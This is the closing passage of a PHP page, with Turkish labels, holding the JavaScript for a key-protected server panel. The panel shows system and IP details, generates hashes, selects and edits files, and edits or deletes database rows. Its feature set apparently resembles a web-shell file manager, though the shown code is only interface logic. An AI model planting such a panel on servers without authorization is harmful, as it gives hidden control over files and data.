            let html = `<div class="server-info-list"><div class="info-row mb-3"><i class="bi bi-terminal"></i> <strong>Sistem:</strong><br><small class="text-muted">${serverInfo.uname}</small></div><div class="info-row mb-3"><i class="bi bi-person-circle"></i> <strong>Kullanıcı:</strong> ${serverInfo.user_id}</div><div class="info-row mb-3"><i class="bi bi-code-slash"></i> <strong>PHP Versiyonu:</strong> ${serverInfo.php_version}</div><div class="info-row mb-3"><i class="bi bi-shield-lock"></i> <strong>Safe Mode:</strong> ${serverInfo.safe_mode}</div><hr><div class="info-row mb-3"><i class="bi bi-globe"></i> <strong>Sunucu IP:</strong> ${serverInfo.server_ip}</div><div class="info-row mb-3"><i class="bi bi-pc-display"></i> <strong>Sizin IP:</strong> ${serverInfo.client_ip}</div><hr><div class="info-row mb-3"><i class="bi bi-clock"></i> <strong>Tarih/Saat:</strong> ${serverInfo.datetime}</div><hr><div class="info-row mb-3 d-block"><div class="d-flex align-items-center mb-1"><i class="bi bi-hdd"></i> <strong>Disk Alanı:</strong><span class="ms-2 small">(Toplam: ${serverInfo.hdd_total} | Boş: ${serverInfo.hdd_free})</span></div><div class="mt-2 w-100"><div class="progress" style="height: 25px; font-size: 14px; background-color: #e9ecef;"><div class="progress-bar ${barColor}" role="progressbar" style="width: ${serverInfo.hdd_percent}%; color: black; font-weight: bold;" aria-valuenow="${serverInfo.hdd_percent}" aria-valuemin="0" aria-valuemax="100">%${serverInfo.hdd_percent} Dolu</div></div></div></div></div>`;
            serverInfoContent.innerHTML = html;
            const modalEl = document.getElementById('serverInfoModal');
            let serverModal = bootstrap.Modal.getInstance(modalEl);
            if (!serverModal) serverModal = new bootstrap.Modal(modalEl);
            serverModal.show();
        }
        async function generateHashes() {
            const input = document.getElementById('encryptInput').value; 
            const results = document.getElementById('hashResults');
            if (!input) { results.innerHTML = ''; return; }
            results.innerHTML = '';
            const md5Hash = CryptoJS.MD5(input).toString(); 
            const sha1Hash = CryptoJS.SHA1(input).toString();
            const hashes = [
                { name: 'MD5', value: md5Hash }, 
                { name: 'MD5 (SHA1)', value: CryptoJS.MD5(sha1Hash).toString() },
                { name: 'SHA1', value: sha1Hash }, 
                { name: 'SHA1 (MD5)', value: CryptoJS.SHA1(md5Hash).toString() },
                { name: 'SHA256', value: CryptoJS.SHA256(input).toString() }, 
                { name: 'SHA512', value: CryptoJS.SHA512(input).toString() }, 
                { name: 'SHA3-256', value: CryptoJS.SHA3(input, { outputLength: 256 }).toString() }, 
                { name: 'SHA3-512', value: CryptoJS.SHA3(input, { outputLength: 512 }).toString() },
                { name: 'RIPEMD160', value: CryptoJS.RIPEMD160(input).toString() }
            ];
            let bcryptHashResult = { name: 'BCRYPT (Cost 10)', value: '', isImportant: true };
            try {
                const bcryptHash = await generateBcryptHashJs(input);
                bcryptHashResult.value = bcryptHash;
            } catch (error) {
                bcryptHashResult.value = 'Hash üretilemedi: ' + error;
                bcryptHashResult.isError = true;
            }
            hashes.push(bcryptHashResult);
            hashes.forEach(hash => {
                const div = document.createElement('div'); 
                div.className = 'hash-result';
                const buttonHtml = hash.isError ? '' : `<button class="btn btn-sm btn-primary" onclick="copyToClipboard('${hash.value}')" title="Kopyala"><i class="bi bi-clipboard"></i></button>`;
                const nameStyle = hash.isImportant ? 'style="color:#0b66ff; font-weight:bold;"' : '';
                div.innerHTML = `<div><strong ${nameStyle}>${hash.name}:</strong><br><code>${hash.value}</code></div>${buttonHtml}`;
                results.appendChild(div);
            });
        }
        async function generateBcryptHashJs(password) {
             return new Promise((resolve, reject) => {
                const fd = new FormData();
                fd.append('encrypt_input', password);
                fetch('?action=hash_generate&key=<?php echo $KEY_PARAM; ?>', { method: 'POST', body: fd })
                .then(response => response.json())
                .then(data => {
                    if (data.bcrypt.startsWith('ERROR:')) {
                        reject(data.bcrypt);
                    } else {
                        resolve(data.bcrypt);
                    }
                })
                .catch(error => {
                    reject('Sunucu hatası: ' + error);
                });
             });
        }
        function updateFileSelection() {
            const checkboxes = document.querySelectorAll('input[name="file[]"]:checked');
            selectedFiles = Array.from(checkboxes).map(cb => cb.value).filter(val => val !== '..');
            const selectAllCheckbox = document.getElementById('selectAll');
            const allCheckboxes = document.querySelectorAll('input[name="file[]"]');
            const allChecked = Array.from(allCheckboxes).filter(cb => cb.value !== '..').every(cb => cb.checked);
            selectAllCheckbox.checked = allChecked && allCheckboxes.length > 1;
        }
        function toggleFileSelection() {
            const selectAllCheckbox = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('input[name="file[]"]');
            checkboxes.forEach(cb => { if (cb.value !== '..') cb.checked = selectAllCheckbox.checked; });
            updateFileSelection();
        }
        function toggleTableSelection() {
            const selectAll = document.getElementById('selectAllTables');
            const checkboxes = document.querySelectorAll('#dbTablesForm .custom-checkbox-style');
            checkboxes.forEach(cb => { if(cb !== selectAll) cb.checked = selectAll.checked; });
        }
        function handleSearchInput() {
            const searchInput = document.getElementById('searchInput');
            const searchValue = searchInput.value;
            if (searchTimeout) {
                clearTimeout(searchTimeout);
            }
            if (searchValue.length > 2 || searchValue.length === 0) {
                searchTimeout = setTimeout(() => {
                    document.getElementById('searchForm').submit();
                }, 400); 
            }
        }
        function editDbRow(rowId, tableName) {
            let row = document.getElementById('db-row-' + rowId);
            let cells = row.getElementsByClassName('db-cell');
            for(let i=0; i<cells.length; i++) {
                let val = cells[i].getAttribute('data-val');
                cells[i].innerHTML = '<input type="text" value="'+val.replace(/"/g, '&quot;')+'">';
            }
            row.querySelector('.db-edit-btn').style.display = 'none';
            row.querySelector('.db-save-btn').style.display = 'inline-block';
            updateActiveDbTable(tableName);
        }
        function saveDbRow(rowId, table, idCol, idVal) {
            let row = document.getElementById('db-row-' + rowId);
            let inputs = row.querySelectorAll('input[type="text"]');
            let cells = row.getElementsByClassName('db-cell');
            for(let i=0; i<inputs.length; i++) {
                let col = cells[i].getAttribute('data-col');
                let val = inputs[i].value;
                let fd = new FormData();
                fd.append('table', table); fd.append('col', col); fd.append('val', val);
                fd.append('id_col', idCol); fd.append('id_val', idVal);
                fetch('?action=db_live_update&key=<?php echo $KEY_PARAM; ?>', { method: 'POST', body: fd })
                .then(r=>r.text()).then(t => {
                    if(t==='OK') {
                        cells[i].innerHTML = val.replace(/</g, "&lt;");
                        cells[i].setAttribute('data-val', val);
                    } else alert('Hata: ' + t);
                });
            }
            row.querySelector('.db-edit-btn').style.display = 'inline-block';
            row.querySelector('.db-save-btn').style.display = 'none';
        }
        function dbRowAction(actionType, table, idCol, idVal) {
            const fd = new FormData();
            fd.append('table', table);
            fd.append('action_type', actionType);
            fd.append('id_col', idCol);
            fd.append('id_val', idVal);
            fetch('?action=db_row_action&key=<?php echo $KEY_PARAM; ?>', { method: 'POST', body: fd })
            .then(r => r.text())
            .then(t => {
                if (actionType === 'delete') {
                    if (t === 'DELETED') {
                        showToast('Satır başarıyla silindi!', 'success');
                        setTimeout(() => { document.querySelector('#db-advanced form button[type="submit"]').click(); }, 500); 
                    } else {
                        showToast('Silme hatası: ' + t, 'danger');
                    }
                }
            })
            .catch(error => {
                showToast('İşlem sırasında bir hata oluştu: ' + error, 'danger');
            });
        }
        function updateActiveDbTable(tableName) {
            document.querySelectorAll('.db-table-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            const activeBtn = document.querySelector(`.db-table-btn[value="${tableName}"]`);
            if (activeBtn) {
                activeBtn.classList.add('active');
            }
        }
        function toggleDbRowSelection() {
            const selectAllTop = document.getElementById('selectAllDbRows');
            const selectAllHeader = document.getElementById('selectAllDbRowsHeader');
            const checkboxes = document.querySelectorAll('.db-row-checkbox');
            const isChecked = selectAllTop ? selectAllTop.checked : (selectAllHeader ? selectAllHeader.checked : false);
            checkboxes.forEach(cb => { cb.checked = isChecked; });
            if (selectAllTop) selectAllTop.checked = isChecked;
            if (selectAllHeader) selectAllHeader.checked = isChecked;
            updateDbRowSelection();
        }
        function updateDbRowSelection() {
            const checkboxes = document.querySelectorAll('.db-row-checkbox:checked');
            const count = checkboxes.length;
            const bulkDeleteBtn = document.getElementById('bulkDeleteBtn');
            const countSpan = document.getElementById('selectedDbRowCount');
            const selectAllTop = document.getElementById('selectAllDbRows');
            const selectAllHeader = document.getElementById('selectAllDbRowsHeader');
            const allCheckboxes = document.querySelectorAll('.db-row-checkbox');
            if (countSpan) countSpan.textContent = count;
            if (bulkDeleteBtn) {
                bulkDeleteBtn.style.display = count > 0 ? 'inline-block' : 'none';
            }
            const allChecked = allCheckboxes.length > 0 && Array.from(allCheckboxes).every(cb => cb.checked);
            if (selectAllTop) selectAllTop.checked = allChecked;
            if (selectAllHeader) selectAllHeader.checked = allChecked;
        }
        function bulkDeleteDbRows() {
            const checkboxes = document.querySelectorAll('.db-row-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('Lütfen silmek için en az bir satır seçin!');
                return;
            }
            if (!confirm(checkboxes.length + ' satır silmek istediğinizden emin misiniz? Bu işlem geri alınamaz!')) {
                return;
            }
            const table = document.getElementById('currentDbTable').value;
            const idCol = document.getElementById('currentDbPkCol').value;
            const idVals = Array.from(checkboxes).map(cb => cb.getAttribute('data-pk-val'));
            const fd = new FormData();
            fd.append('table', table);
            fd.append('id_col', idCol);
            fd.append('id_vals', JSON.stringify(idVals));
            fetch('?action=db_bulk_row_delete&key=<?php echo $KEY_PARAM; ?>', { method: 'POST', body: fd })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showToast(data.deleted + ' satır başarıyla silindi!' + (data.errors > 0 ? ' (' + data.errors + ' hata)' : ''), 'success');
                    setTimeout(() => { document.querySelector('#db-advanced form button[type="submit"]').click(); }, 500);
                } else {
                    showToast('Silme hatası: ' + data.error, 'danger');
                }
            })
            .catch(error => {
                showToast('İşlem sırasında bir hata oluştu: ' + error, 'danger');
            });
        }
        function toggleCustomDate(selectedValue) {
            const customDateContainer = document.getElementById('date_custom_container');
            if (selectedValue === 'custom_date') {
                customDateContainer.style.display = 'block';
                document.querySelector('#date_custom_container input').focus();
            } else {
                customDateContainer.style.display = 'none';
                document.querySelector('#collapseOne form').submit(); 
            }
        }
        document.addEventListener('DOMContentLoaded', () => {
            const rangeValue = document.getElementById('range').value;
            const customDateContainer = document.getElementById('date_custom_container');
            if (rangeValue === 'custom_date') {
                customDateContainer.style.display = 'block';
            } else {
                customDateContainer.style.display = 'none';
            }
            if (IS_RECURSIVE_MODE === 'true') {
                const accordion = new bootstrap.Collapse(document.getElementById('collapseOne'), { toggle: false });
                accordion.show();
            }
            const searchTypeSelect = document.getElementById('searchTypeSelect');
            if (searchTypeSelect.value === 'content' && document.getElementById('searchInput').value !== '') {
            }
        });
        <?php if ($fileToEdit) { ?> setTimeout(() => { openEditModal('<?php echo addslashes(encPath($fileToEdit)); ?>'); }, 500); <?php } ?>
        <?php if ($open_db_modal) { ?>
            document.addEventListener('DOMContentLoaded', function() {
                var modal = new bootstrap.Modal(document.getElementById('databaseExportModal'));
                modal.show();
                var triggerEl = document.querySelector('#advanced-db-tab');
                var tab = new bootstrap.Tab(triggerEl);
                tab.show();
                var tableViewerEl = document.querySelector('#db-table-viewer');
                var tableViewerTab = new bootstrap.Tab(tableViewerEl);
                tableViewerTab.show();
                updateActiveDbTable(activeDbTable);
            });
        <?php } ?>
    </script>
</body>
</html>